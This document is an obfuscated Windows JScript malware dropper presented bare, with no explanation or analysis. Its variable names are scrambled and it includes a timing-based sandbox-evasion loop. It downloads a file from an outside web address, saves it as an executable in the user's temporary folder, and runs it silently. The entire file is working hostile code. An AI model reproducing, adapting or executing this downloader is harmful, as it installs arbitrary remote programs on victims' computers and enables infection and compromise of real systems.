var _LY = false;
var _H0 = "CreateObject";
var _C = function _LR() {return WScript[_H0]("WScript"+".Shell");}(), _HX = 11;
var _PC = "MSXML2.XMLHTTP";
var _G = 2123213;
var _EI = 0;
function _RD(_U1){_C["Run"](_U1, _EI, _EI);};
function _WV(){return _PC + "";};
function _KM(_Q, _CF){_EI = _EI * 1; return _Q - _CF;};
function _TG(){return _H0;};
/*@cc_on
  @if (@_win32 || @_win64)
    _LY = true;
  @end
@*/
if (_LY)
{
var _A = "";
function _IV(){return 22;};
var _YT = 0; var _Y = 0;
function _MC()
{
var _IZ = new this["Date"]();
var _U0 = _IZ["getUTCMilliseconds"]();
WScript["Sleep"](_IV());
var _IZ = new this["Date"]();
var _PT = _IZ["getUTCMilliseconds"]();
WScript["Sleep"](_IV());
var _IZ = new this["Date"]();
var _U = _IZ["getUTCMilliseconds"]();
var _YT = "_H1";
_YT = _KM(_PT, _U0);
var _Y = "_P";
_Y = _KM(_U, _PT);
_A = "open";
return _KM(_YT, _Y);
}
var _BX = false;
var _EE = false;
for (var _WV0 = _EI; _WV0 < _IV() * 1; _WV0++){if (_MC() != _EI){
_BX = true; 
_Y = "31" + 11 * _YT + _Y; 
_EE = true; 
break;
}}
function _PF() {return ((_BX == true) && (_BX == _EE)) ? 1 : _EI;};
if (_BX && _PF() && _EE){
function _PM() {return _C["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "afXr14xn.ex" + "e";};
 _Z = _WV();
 _V = WScript[_H0](_Z);
 var _TC = 1;
 while (_TC){
try {
	if (_TC == 1)
	{
		_V[_A]("GET", "http://pro.monbento.com/n3iska", false);
		_V["send"]();
		_ZC = "Sleep";
	}
	WScript[_ZC](_IV() + 120); 
	if (_V["readystate"] < 2 * 2) continue;
	_TC = _EI;
	function _H(_GU) {var _YG = (1, 2, 3, 4, 5, _GU); return _YG;};
	_KY = WScript[_TG()]("ADODB.Stream");
	_Z = _KY;
	_Z[_A]();
	_Z["type"] = _H(1);
	_Z["write"](_V["ResponseBody"]);
	_KY["position"] = _H(_EI);
	_Z["Save" + "ToFile"](_PM(), 2);
	_KY["cl"+"ose"]();
	_I = _PM();
	_RD(_I);
} catch(_S){};
}
}
}

